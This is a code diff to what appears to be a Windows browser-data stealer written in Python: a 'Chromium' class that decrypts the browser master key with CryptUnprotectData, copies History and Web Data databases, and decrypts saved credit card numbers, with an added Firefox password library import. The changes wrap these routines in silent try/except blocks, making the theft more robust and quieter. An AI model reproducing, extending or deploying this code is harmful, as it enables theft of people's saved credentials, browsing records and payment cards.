@@ -19,6 +19,7 @@ import json
 import os
 import shutil
 import sqlite3
+import ffpass
 import configparser
 import subprocess
 import win32crypt
@@ -258,11 +259,17 @@ class Chromium:
             return "Chrome < 80"    
 
     def decrypt_payload(self,cipher, payload):
-        return cipher.decrypt(payload)
+        try:
+            return cipher.decrypt(payload)
+        except:
+            pass
 
 
     def generate_cipher(self,aes_key, iv):
-        return AES.new(aes_key, AES.MODE_GCM, iv)
+        try:
+            return AES.new(aes_key, AES.MODE_GCM, iv)
+        except:
+            pass
 
     def get_cookies(self, path: str, profile: str):
         try:
@@ -324,9 +331,12 @@ class Chromium:
 
     def get_master_key_chromium(self,path: str):
         try:
-            with open(rf'{path}\Local State', "r", encoding='utf-8') as f:
-                local_state = f.read()
-                local_state = json.loads(local_state)
+            try:
+                with open(rf'{path}\Local State', "r", encoding='utf-8') as f:
+                    local_state = f.read()
+                    local_state = json.loads(local_state)
+            except:
+                local_state = ''
             master_key_chrome = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
             master_key_chrome = master_key_chrome[5:]  
             master_key_chrome = win32crypt.CryptUnprotectData(master_key_chrome, None, None, None, 0)[1]
@@ -376,47 +386,53 @@ class Chromium:
             return "Can't decode"
 
     def get_downloads(self, path: str, profile: str):
-        if path != "\\Opera Software\\Opera GX Stable" or path != "\\Opera Software\\Opera Stable":
-            downloads_db = f'{path}\\{profile}\\History'
-        else:
-            downloads_db = f'{path}\\History'
-        if not os.path.exists(downloads_db):
-            return
+        try:
+            if path != "\\Opera Software\\Opera GX Stable" or path != "\\Opera Software\\Opera Stable":
+                downloads_db = f'{path}\\{profile}\\History'
+            else:
+                downloads_db = f'{path}\\History'
+            if not os.path.exists(downloads_db):
+                return
 
-        shutil.copy(downloads_db, 'downloads_db')
-        conn = sqlite3.connect('downloads_db')
-        cursor = conn.cursor()
-        cursor.execute('SELECT tab_url, target_path FROM downloads')
-        for row in cursor.fetchall():
-            if not row[0] or not row[1]:
-                continue
+            shutil.copy(downloads_db, 'downloads_db')
+            conn = sqlite3.connect('downloads_db')
+            cursor = conn.cursor()
+            cursor.execute('SELECT tab_url, target_path FROM downloads')
+            for row in cursor.fetchall():
+                if not row[0] or not row[1]:
+                    continue
 
-            downloads.append(Types.Download(row[0], row[1]))
+                downloads.append(Types.Download(row[0], row[1]))
 
-        conn.close()
-        os.remove('downloads_db')
+            conn.close()
+            os.remove('downloads_db')
+        except:
+            pass
 
     def get_credit_cards(self, path: str, profile: str):
-        if path != "\\Opera Software\\Opera GX Stable" or path != "\\Opera Software\\Opera Stable":
-            cards_db = f'{path}\\{profile}\\Web Data'
-        else:
-            cards_db = f'{path}\\Web Data'
-        if not os.path.exists(cards_db):
-            return
+        try:
+            if path != "\\Opera Software\\Opera GX Stable" or path != "\\Opera Software\\Opera Stable":
+                cards_db = f'{path}\\{profile}\\Web Data'
+            else:
+                cards_db = f'{path}\\Web Data'
+            if not os.path.exists(cards_db):
+                return
 
-        shutil.copy(cards_db, 'cards_db')
-        conn = sqlite3.connect('cards_db')
-        cursor = conn.cursor()
-        cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
-        for row in cursor.fetchall():
-            if not row[0] or not row[1] or not row[2] or not row[3]:
-                continue
+            shutil.copy(cards_db, 'cards_db')
+            conn = sqlite3.connect('cards_db')
+            cursor = conn.cursor()
+            cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
+            for row in cursor.fetchall():
+                if not row[0] or not row[1] or not row[2] or not row[3]:
+                    continue
 
-            card_number = self.decrypt_password(row[3], self.master_key)
-            cards.append(Types.CreditCard(row[0], row[1], row[2], card_number, row[4]))
+                card_number = self.decrypt_password(row[3], self.master_key)
+                cards.append(Types.CreditCard(row[0], row[1], row[2], card_number, row[4]))
 
-        conn.close()
-        os.remove('cards_db')
+            conn.close()
+            os.remove('cards_db')
+        except:
+            pass
 
 class Types:
     class Download:
